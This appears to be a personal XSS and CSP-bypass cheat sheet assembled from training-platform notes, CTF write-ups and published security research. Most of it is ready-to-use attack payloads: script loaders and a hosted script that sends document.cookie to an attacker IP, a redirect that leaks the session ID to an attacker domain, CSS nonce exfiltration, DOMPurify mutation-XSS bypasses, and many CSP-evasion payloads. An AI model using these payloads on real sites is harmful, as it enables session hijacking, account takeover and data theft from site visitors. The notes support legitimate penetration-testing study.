As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome).


|Type 	     |       Description |
|--------------|---------------|
Stored (Persistent) XSS 	   |      occurs when user input is stored on the back-end database and then displayed upon retrieval 
Reflected (Non-Persistent) XSS 	|    Occurs when user input is displayed on the page after being processed by the backend server
DOM-based XSS 	            |   occurs when user input is directly shown in the browser and is completely processed on the client-side , and embeded in the DOM.


# Stored XSS (P3rsistent)

If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

`<script>alert(window.origin)</script>`


    Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we pop window.origin in the alert box.


# Reflected XSS


Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.



# DOM XSS


While reflected XSS sends the input data to the back-end server through HTTP requests, **DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).**




## Source & Sink

The **Source** is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

The **Sink** is the function that writes the user input to a DOM Object on the page. Some of the commonly used JavaScript functions to write to DOM objects are:

- document.write()
- DOM.innerHTML
- DOM.outerHTML

Some of the **jQuery** library functions that write to DOM objects are:

- add()
- after()
- append()

        

    ! innerHTML function does not allow the use of the `<script>` tags within it as a security feature.

    `<img src="" onerror=alert(window.origin)>`


# Discovery

- Automated 

Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities.


#### XXStrike
```
$ git clone https://github.com/s0md3v/XSStrike.git

$ cd XSStrike

$ pip install -r requirements.txt

$ python xsstrike.py

$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```


- Manual Discovery

We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox]().

    Note: You may XSS  in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).




# Defacing

Defacing a website means changing its look for anyone who visits the website. 


### Defacement Elements

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color document.body.style.background
- Background document.body.background
- Page Title document.title
- Page Text DOM.innerHTML


### Changing Background

`<script>document.body.style.background = "#141d2b"</script>`


        ! This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.


OR set an image to the background using the following payload

`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`


### Changing Page Title

`<script>document.title = 'HackTheBox Academy'</script>`



### Changing Page Text

`document.getElementById("todo").innerHTML = "New Text"`

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the jQuery library must have been imported within the page source):

`$("#todo").html('New Text');`

change the entire HTML code of the main body, using innerHTML, as follows:

`document.getElementsByTagName('body')[0].innerHTML = "New Text"`



# Session Hijacking


### Blind XSS Detection

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Exploit 

Host a file.js like:

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```


and inject the payload

```
<script src=http://OUR_IP/script.js></script>
```





# Mutation XSS
[cure53's_paper](https://cure53.de/fp170.pdf)
### Purpose 

The purpose of this technique is to bypass famous sanitizing libraries such as DOMPurify and execute JS code
client side , in the form of cross site scriptng.

### Why mXSS exists

Mutation XSS exists primarely because HTML Parsers are fault tolerant in a way that they permit developers
to make 'mistakes' in their code but the parsers 'fix' them in order to keep internet running.
Also , sanitizing software and their developers usually assume that their parsing libraries and the way
browsers parse the HTML-like text into the DOM-tree stucture , is always the same.Thats not always true


### Example : Bypassing DOMPurify

[securitumBlog](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

```div.innerHTML = DOMPurify.sanitize(htmltext)```

In the above line of code , execution follows these steps:

1. sanitize() first passes html text into an `<element>` tag and parses the tokenised string into DOM.

2. DOMPurify sanitizes the DOM Tree, deleting all nodes that are not in the allow-list.

3. The DOM tree is serialized back into the HTML text.

4. innerHTML does the same thing with step no1 as it expects a html like string as input.

5. the parsed DOM Tree is appended to the DOM of the document.


Developers assume that steps number 1 and 4 are going to produce the same result but Thats
not always true.

[html.spec](https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments)


this specification gives an example .

`<form id="outer"><div></form><form id="inner"><input>`

this code converts to this DOM Tree

```
   <form id="outer">
   |
    ---> <div>
       |
        ---> <form id="inner">
           |
            ----> <input/>
```


- When you open a `<form>` tag, the parser needs to keep record of the fact that it was opened with a form element pointer . If the pointer is not null, then form element cannot be created.
- When you end a `<form>` tag, the form element pointer is always set to null. 
- So by setting the `</form>` and closing the first form after 
the `<div>` tag , pointer is set to null.

- ! The input element will be associated with the inner form element.

Following step 3 and serializing the DOM Tree produces this string

`<form id="outer"><div><form id="inner"><input></form></div></form>`

DOM Tree now looks like this :

```
   <form id="outer">
   |
    ---> <div>
       |
        ---> <input/>
           
```

- !  the input element will be associated with the outer form element instead.

#### Foreign Content 


HTML Documents and parsers have three name spaces:

-    [HTML namespace](http://www.w3.org/1999/xhtml)
-    [SVG namespace](http://www.w3.org/2000/svg)
-    [MathML namespace](http://www.w3.org/1998/Math/MathML)

besides html namespace, the other two specify the foreign namespace.


Elements in foreign Content behave differently.

MathML and  HTML Integration points are elements that when declared 
in the Tree, HTML namespace is switched back for their child elements from
MATHML and SVG namespaces respectively.

- MathML text integration points are:

    - math mi
    - math mo
    - math mn
    - math ms
    - math mtext

- HTML integration points are:

    - math annotation-xml if it has an attribute called encoding whose value is equal to either text/html or application/xhtml+xml
    - svg foreignObject
    - svg desc
    - svg title

These are the Rules governing this behaviour:


1. If current element is `<svg>` or `<math>` and parent is in HTML namespace, then current element is in SVG or MathML namespace respectively.
2. Current element is in the namespace of its parent unless:
3. If parent of current element is an HTML integration point, then current element is in HTML namespace unless it’s `<svg>` or `<math>`
4. If parent of current element is an MathML integration point, then current element is in HTML namespace unless it’s `<svg>`, `<math>`, `<mglyph>` or `<malignmark>`



So the payload 

`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`

produces :

```
   <(html) form >
   |
    ---> <(MathML) math>
       |
        ---> <(MathML) mtext>
           |
            ----> <(html) form>
                |
                 ----> <(html) mglyph>
                     |
                      ----> <(html) style>
                           |
                            ----> #text : "</math><img src onerror=alert(1)>"
                       
```


After serializing the string in step 3 is:

`<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>`


Nested `<form>` is ommited when passed in innerHTML so the DOMTree becomes:

```
   <(html) form >
   |
    ---> <(MathML) math>
       |
        ---> <(MathML) mtext>
           |
            ----> <(MathML) mglyph>
                |
                 ----> <(MathML) style>
                     |
                      ----> <(math) style>
                           |
    <(html) img src onerror=alert(1)>"      
```

Check also [Portswigger](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
[mizu_blog](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes) with  a lot of resources!





# Tips n Tricks

## letters and ' ()+_\* ' + space allowed

[zer0pts CTF 2021 - Kantan Calc](https://github.com/aszx87410/ctf-writeups/issues/22)
[corctf 2022 - sbxcalc](https://str.lc/posts/corctf_2022_challenges/#sbxcalc)


- This pattern can be found in browser calc apps
- Usually executed in `vm` context and built with [Proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy) objects to control their prototypes.
-  Object.getOwnPropertyDescriptor overrides the Proxy's defined getter method.
- You can use the [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) statement to add context to namespace and bypass restrictions of using `.` and `[]`.


```javascript
with(console) log(5)

with(Object)with(getOwnPropertyDescriptors(flag))with(1+values(FLAG))at(1)
```

## No Parenthesis or semicolon

[portswigger](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
[explanation article](https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/)

```javascript
<script>onerror=alert;throw 1</script>


<script>{onerror=alert}throw 1</script>

<script>throw onerror=alert,1</script>

<script>{onerror=eval}throw'=alert\x281337\x29'</script>
```

- throw accepts statements as atributes
- it peaks the last expression to throw in error handler
- You cant `<script>onerror=alert, throw 1</script>` as throw is a statement , not an expression. So this will produce an error.
- You can use code blocks to isolate one part from another

## No letters restrictions

- In some situations, like calc emulators in browsers, the characters allowed are for example [0-9\[\]{}$] 
- You can derive ascii characters from known javascript bultins

```javascript
1. `${``+{}}` => "[object Object]"
2. `${``[0]}` => "undefined"
3. `${e}` => "[object HTMLProgressElement]"
4. `${0/0}` => "NaN"

`${[]['constructor']}`
=> "function Array() { [native code] }"

const mapping = {
  a: '`${0/0}`[1]',
  c: '`${``+{}}`[5]',
  d: '`${``[0]}`[2]',
  e: '`e`',
  i: '`${``[0]}`[5]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${``[0]}`[1]',
  o: '`${``+{}}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${``+{}}`[6]',
  u: '`${``[0]}`[0]',
  ".": '`.`'
}
```

#### Using location.search or document.body.innerText

```javascript
document.body.innerHTML=location.search;
document.body.innerHTML=document.body.innerText;
// in URL: ?&lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;
```

#### Firefox payloads

```
onerror=alert;
throw 1;
// uncaught exception: 1
```

- You neeed to manipulate the uncaught exception string


```
onerror=alert;
throw new Error(1);
// Error: 1
```


- Error() produces a cleaner error string but uses parentesis
- You can throw an object with the apropriate properties 

```
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```

You can use the fileName property to send a second argument on Firefox too:

```
<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
```



## Tagged template strings


Template strings in the form of :

```
`Hello ${name}`
```

can be prepended with a function and become Tagged leterals:

```
console.log`Hello ${name}`
```

When calling a function with a template string syntax , parameters are passed to the funxtion as follows:

for the string `My ${attribute} is ${atr_name} !` the function is called with

-First parameter is an array of all strings separated by placeholders, in this example is ['My', 'is', '!']

- placeholders like attribute and atr_name, are passed as single paramateres after.

For example:

```
const attribute = 'colour'
const atr_name = 'blue' 
function func(...args){
    console.log(args)
}

func`My ${attribute} is ${atr_name} !`
//[ ['My', 'is', '!'], 'colour' , 'blue' ]
```

#### passing parameters with tagged strings

- alert() just throws back whatever you give it as parameters
- But other functions are more structural regarding its variables and their position
- tagged string parse the string provided and provides the variables as follows:

```javascript
function noop(...args) {
  console.log(args)
}

noop`1` // [["1"]]
noop`${'abc'}`// [["", ""], "abc"]
noop`1${'abc'}2` // [["1", "2"], "abc"]
noop`1${'a'}2${'b'}3${'c'}` // [["1", "2", "3", ""], "a", "b", "c"]
```

- `Function` which is the constructor of functions in js, which can be used as a means for XSS
- can be accessed by different types
    - `[]['constructor']['constructor'] === Function // true`
    - `'a'['constructor']['constructor'] === Function // true`
- Operates as follows:

```javascript
//Function('a', 'b', 'return a+b')
function (a, b) {
  return a+b
}
```

- So to construct a function in the above senario and execute it:

```javascript
[]['constructor']['constructor']`_${'alert(1)'}``｀
[]['constructor']['constructor']`_${'eval(location.hash.slice(1))'}`` `


function anonymous(_,) {
  alert(1)
}
```

#### Usage 1 


you dynamically generate functions that execute with that method with [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)

`new Function(arg1, arg2, /* …, */ argN, functionBody)`

- `new` can be ommited

- the `functionBody` (last parameter) is the actual executed code

- is equivelant to 

```javascript
function anonymous(${args.join(",")}
) {
${functionBody}
}`;
```

- so for example ```Function`alert(1)` ``` => ```anonymous() { alert(1) }```

- Since you operate inside strings you can also use unicode/hex characters

- to imediatelly call the function you can use `` again with a space or not

``` Function`alert\x281337\x29` ``  ```
``` Function`alert\u00281\u0029` `` ```

``` Function`_${location.hash.slice`1`}` `` ```

## Bypass X-XSS-Protection


#### Usage 1 - X-XSS-Protection: 1; mode=block

Utilize the Byte-Order Mark (BOM) and change the encoding of the data , since X-XSS-Protect sees `<script>`
[docs](https://encoding.spec.whatwg.org/#specification-hooks)

Initiall bytes:

-  0xEF 0xBB 0xBF for UTF-8
-  0xFE 0xFF for UTF-16BE
-  0xFF 0xFE for UTF-16LE

```
00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.<.s.c.r.i.p.
00000010: 74 00 3e 00 61 00 6c 00 65 00 72 00 74 00 28 00  t.>.a.l.e.r.t.(.
00000020: 31 00 29 00 3c 00 2f 00 73 00 63 00 72 00 69 00  1.).<./.s.c.r.i.
00000030: 70 00 74 00 3e 00                                p.t.>.
```

#### Usage 2 -  X-XSS-Protection: 1

[portswiger research](https://portswigger.net/research/abusing-chromes-xss-auditor-to-steal-tokens)

Sometimes browser will delete legit code in a script if it also present in a URI

eg
```
<script>
  var productionMode = true;
</script>
<!-- [...] -->
<script>
  if (!window.productionMode) {
    // Some vulnerable debug code
  }
</script>
```
- submit `?var=%3Cscript%3Evar%20productionMode%20%3D%20true%3B%3C%2Fscript%3E`

- Browser might not execute the var productionMode = true; if it thinks it included by the URI.



# Bypass CSP
  
[CSPBypass](https://cspbypass.com/)
[GMSGadget](https://gmsgadget.com/)

## Bypass CSP:  base-uri Bypass

- If base-uri directive is absent ( If this value is absent, then any URI is allowed, and doesnt fallback to default-src)
- And the app includes js files with relative paths , **included after the point of injection**
- Content-Security-Policy: script-src 'nonce-abcd1234';

```javascript
<Base Href=//attacker.com>
```
- Follow the scheme the root document uses(https most probably)

## Bypass CSP: script-src 'self'; object-src 'none';

- you could imply the same endpoint again in a script tag

`<script src="./vuln_endpoint?vuln_param=alert(1)//"></script>`

- Allow 'self' + hosting user-provided content on the same origin

`">'><script src="/user_upload/evil_cat.jpg.js"></script>`

## Bypass CSP: unsafe-eval

- script-src  https://google.com 'unsafe-eval' data: http://*; child-src 'none';

```javascript
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

## Bypass CSP: object-src completely missing (default-src aswell)

- Content-Security-Policy: script-src 'self' ;

```javascript
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

```javascript
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'><param name="AllowScriptAccess" value="always"></object>
```

## Bypass CSP : URL schemes or wildcard in script-src (and no 'strict-dynamic')

- data: allowed
- script-src 'self' https: data: *; object-src 'none';
```javascript
">'><script src=data:text/javascript,alert(1337)></script>
```

## Bypass CSP: JSONP-like and CDN endpoints in whitelist

- [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) is a list of potentially usefull jsonp endpoints

- script-src 'self' https://whitelisted.com; object-src 'none';

```javascript
">'><script src="https://whitelisted.com/jsonp?callback=alert">
```

```javascript
<!-- *.googleapis.com -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
<!-- *.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
<!-- ajax.googleapis.com (click) + maps.googleapis.com (no click) -->
<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js></script>
<div ng-app ng-csp id=x ng-click=$event.view.alert($event.view.document.domain)></div>
<script async src=https://maps.googleapis.com/maps/api/js?callback=x.click></script>
<!-- cdnjs.cloudflare.com -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}</div>
```

- if for example a non-usefull path is specified , but the cdn is one with usefull gadgets, try path traversal with double url encoded values
- `Content-Security-Policy: default-src 'none'; style-src 'self'; img-src 'self'; script-src https://cdnjs.cloudflare.com/ajax/libs/jquery/`

```javascript
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fprototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>

{{$on.curry.call().alert(1)}}

</div>
```

## Bypass CSP: AngularJS library in whitelist

- script-src 'self' https://whitelisted-domain.com; object-src 'none';
-  script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;

```javascript
"><script
src="https://whitelisted.com/angularjs/1.1.3/angular.min.js">
</script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>

or

ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
```
```javascript
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
```

## Bypass CSP: whitelist cloudflare.com

- script-src 'unsafe-eval' 'https://cdnjs.cloudflare.com';

```javascript
<Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js>
</Script><K Ng-App>{{$new.constructor('alert(1)')()}}
```

## Bypass CSP: using iframes

- Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ; 

```javascript
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

```javascript
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
## Bypass CSP: Location update

- You could change the document.location to a server you control

```javascript
var sessionid = document.cookie.split('=')[1] + "."; 

document.location = "https://www.attacker-owned-website.com/?" + sessionid;
```


## Bypass CSP: Path relaxation due to  open redirect in whitelist
[W3C](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects)

- You can access a domain listed in script-src(or any directive) with relaxed path restrictions, if you redirect to it through another allowed path.
- script-src https://whitelisted.com/totally/secure.js https://site.with.redirect.com; object-src 'none';
- For example , in the above CSP visit https://site.with.redirect.com/redirect?url=https://whitelisted.com/not-allowed

```javascript
">'><script src="https://site.with.redirect.com/redirect?url=https%3A//whitelisted.com/jsonp%2Fcallback%3Dalert"
```
## Bypass CSP: php:apache container

- In some versions of php apps , it might be possible to bypass setting the csp header as follows.
- The attacker must find a way to send data from server to user agent **before** reaching the `header()` function which sends the csp header
    - in HTTP, headers must come before content
- For example , you might set way to many request variables(more than 1000) in order to error on some older versions of php.
- Other containers besides php:apache might as well be vulnerable

## Bypass CSP: Inject directives

- There are some rare cases where CSP Header (or meta tag) is generates dynamically server side.
- The attacker might be able to inject content in the process and poison the csp header.
- Check for CRLF Injection and new-lines, and possible `;` characters.
- If you inject at the end of the csp content, you could try `script-src-elem` or `style-src-elem`, both working in conjunction with `script-src` and `style-src`
- `Content-Security-Policy: script-src 'none'; script-src-elem 'unsafe-inline'`  allows inline script tags


## Bypass CSP: nonce and strict-dynamic

- `<script src=x nonce="rand"></script>`

- **nonce** is appearing in the DOM as an element [attribute](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes%3Aattr-nonce)

```
Elements that have a nonce content attribute ensure that the cryptographic nonce is only exposed to script (and not to side-channels like CSS attribute selectors) by taking the value from the content attribute, moving it into an internal slot named [[CryptographicNonce]], exposing it to script via the HTMLOrSVGElement interface mixin, and setting the content attribute to the empty string. Unless otherwise specified, the slot's value is the empty string.
```
- This generally means we can access the `nonce` attribute of an element using javascript (for example inside a script tag), and effectively [make a strict csp from nonce only to strict-dynamic](https://github.com/w3c/webappsec-csp/issues/458) ,even though the spec states that it trys to hide this attribute by putting it in internal slot **CryptographicNonce**

```
the w3c specs, and browser implementations of Chrome and Firefox, allow any running script to extract the nonce from a DOM element, thus being able to load any remote script and bypass the CSP.
The "strong" policy without strict-dynamic, essentially becomes strict-dynamic anyway, since any running script can access the nonce from the DOM and use it to load any other script from any origin.
```

#### Exfiltrate nonce with css selectors

[w3c](https://w3c.github.io/webappsec-csp/#nonce-exfiltration-content-attributes)

```javascript
script[nonce=a] { background: url("https://evil.com/nonce?a");}
```


#### nonce + strict-dynamic + unsafe-eval

- Reflected/Stored XSS mitigated
- eval() is still allowed
- possible injection in dynamic script creation is allowed

#### nonce + strict-dynamic

- Reflected/Stored XSS mitigated (schemes like javascript,data, etc. as well )
- eval() is not allowed
- possible injection in dynamic script creation is allowed

## Bypass CSP: script-src-elem and script-src-attr

- these two as the name implies are controlling specifically javascript in script tags and javascript in attributes (like inline event handlers)
- They overide script-src directive on their part of influence

- **script-src-elem** applies to script requests (`<script src=example.com>`) and inline blocks (`<script>alert(1)</script>`)

- ! script-src-elem is not used as a fallback for the worker-src directive

```javascript
script-src-attr 'unsafe-hashes' 'sha256-...';
script-src-elem 'nonce-rand' 'strict-dynamic' 'unsafe-eval';
```
## CSP Bypass : www.google-analytics.com Dangling Markup

[github blog](https://github.blog/engineering/platform-security/githubs-post-csp-journey/#img-src-how-scary-can-an-image-really-be)

- A strict policy might allow directives like images or fetch targets
- You can leave sensitive content with a dangling markup attack if html injectio is possible

```html
<img src="attacker.com/?a=
```

- img-src: 'self' data: 'www.google-analytics.com'
- setup a Google Analytics account 
- upload an image
- ea parameter stores the string specified in the acoount`s image referenced

```html
<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
```


## CSP Bypass : permisive object directive

- default-src: 'self'; object-src: *;

```javascript
<object width=1000 height=1000 type=text/html><param name=url value="https://attacker.net">
```

## Mulitple Policies

- By sending a CSP Header again , you effectively add more restrictions instead of broadening the whitelist set.

- For example, 

```javascript
script-src 'nonce-rand'; ....
script-src 'self';
```
- needs to both have the nonce attribute **AND** be of self origin

- Notice that by appending a directive already existand in the same metatag/header , results in the second one being completely ignored

```html
<meta http-equiv="Content-Security-Policy"
content="defualt-src 'self';
connect-src 'self' https://mainsite.com;
script-src 'self' 'unsafe-eval' https://mainsite.com; 
connect-src https://evil.com;"> <!-- Duplicate %1$S directives detected. All but the first instance will be ignored.
```

## Bypass CSP : CRLF Injection in query params + strict CSP
[critical thinkink research](https://lab.ctbb.show/research/crlf-injection-nested-response-splitting-csp-gadget)

- Lets say a page has a CRLF Injection and you can achieve Reflected XSS by Response Splitting.
    - For example , in a content-type header:
    - `/static/css/main.css?type=text/html%0d%0a%0d%0a%3Cscript%3Ealert(origin)%3C/script%3E`
- And the page is protected by a strict CSP policy : `script-src: 'self';`
    - which is gonna block the above RXSS payload.
- You can try to bypass the CSP with a Nested Response splitting
- The script tag will have a src attribute with a relative path to include a resource in self origin
    - `<script src="/static/css/main.css?type=text/javascript%0d%0a%0d%0aalert(origin)"></script>`
- To resolve propable error you can Inject Headers like Content-Length or Transfer-Encoding:chunked

```
/static/css/main.css?type=text/html%0d%0a%0d%0a%3Cscript+src=%22/static/css/main.css?type=text/javascript%250d%250aContent-Length:%252013%250d%250a%250d%250aalert(origin)%22%3E%3C/script%3E
```

```
/static/markdown/example.md?type=text/html%0d%0a%0d%0a%3Cscript+src=%22/static/css/main.css?type=text/javascript%250d%250aTransfer-Encoding%3a%2520chunked%250d%250a%250d%250ad%250d%250aalert(origin)%250d%250a0%250d%250a%250d%250a%22%3E%3C/script%3E
```

# DOMPurify


## Dangerous Config

[mizu.re blog](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations?utm_source=blog.criticalthinkingpodcast.io&utm_medium=referral&utm_campaign=hackernotes-ep-111-how-to-bypass-dompurify-with-kevin-mizu#dompurify-misconfigurations-101)

#### Allow tags and attributes

-    ALLOWED_TAGS : **Overwrite** the default ALLOWED_TAGS value.
-    ALLOWED_ATTR : **Overwrite** the default ALLOWED_ATTR value.
-    ADD_TAGS : **Add** tags to the ALLOWED_TAGS value.
-    ADD_ATTR : **Add** tags to the ALLOWED_ATTR value.

##### Example

```
{
    ALLOWED_TAGS: [ "script" ],
    ADD_TAGS: [ "noscript" ],
    ALLOWED_ATTR: [ "onload" ],
    ADD_ATTR: [ "onerror" ]
}
```

`a<script onload="" onerror=""></script><noscript></noscript>`


#### URI allowlists

- ALLOWED_URI_REGEXP : It is designed to overwrite the default allowed URI regex. (eq to /regex/).

##### Example

```
{
    "ALLOWED_URI_REGEXP": /https:\/\/mizu.re/
}
```

`<a href="javascript:alert(1)//https://mizu.re">CLICK ME :)</a>`

#### URI attribute Whitelisting

- ADD_URI_SAFE_ATTR : This aims to whitelist a specific type of URI attribute from being sanitized.

##### Example

```
{
    "ADD_URI_SAFE_ATTR": ["href"]
}
```

`<a href="javascript:alert(1)" ></a>`


#### Bad/Undefined context awareness

##### Example

```
const express = require("express");
const { JSDOM } = require("jsdom");
const DOMPurify = require("dompurify");
const app = express();

app.get("/sanitize", (req, res) => {
  const dom = new JSDOM("");
  const purify = DOMPurify(dom.window);
  const cleanHTML = purify.sanitize(req.query.html);
  res.send("<textarea>"+cleanHTML+"</textarea>");
});

app.listen(3000, () => {});
```

bypass with:

`<div id="</textarea><img src=x onerror=alert()>"></div>`

##### Example

```
<div id="data1"></div>
<div id="data2"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.2/purify.min.js"></script>
<script>
    const params = new URLSearchParams(location.search);
    const data   = JSON.parse(params.get("data"));
    document.getElementById("data1").innerHTML = DOMPurify.sanitize(data["data1"]);
    document.getElementById("data2").innerHTML = DOMPurify.sanitize(data["data2"]);
</script>
```


In some old versions you can hijack the `data2` name and inject svg namaspace payloads, like the ones used in mXSS to bypass DOMPurify.

`{"data1":"<svg id='data2'></svg>","data2":"x<style><!--</style><a id='--&gt;<title><img src=x onerror=alert()>'>"}`